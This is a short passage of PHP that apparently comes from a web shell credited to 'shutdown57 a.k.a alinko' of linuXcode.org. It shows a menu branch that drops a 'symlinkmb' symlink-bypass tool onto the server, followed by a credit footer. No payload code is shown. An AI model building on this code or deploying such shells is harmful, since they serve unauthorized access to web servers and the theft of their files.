	$html->backtolo();
}elseif ($x == "symb") {
	$act->kuchiyose45($arrayku1945['symlinkmb'],$arrayku1945['filename']['symlinkmb']);
	$html->backtolo();
}
}

}
// footer
$foot = "copyright &copy; ".date('Y')." <a href='http://www.linuXcode.org' target='_blank'>linuXcode.org</a> | c0ded by : <a href='https://facebook.com/JKT48.co'>shutdown57 a.k.a alinko</a>";
$html->footer($foot);
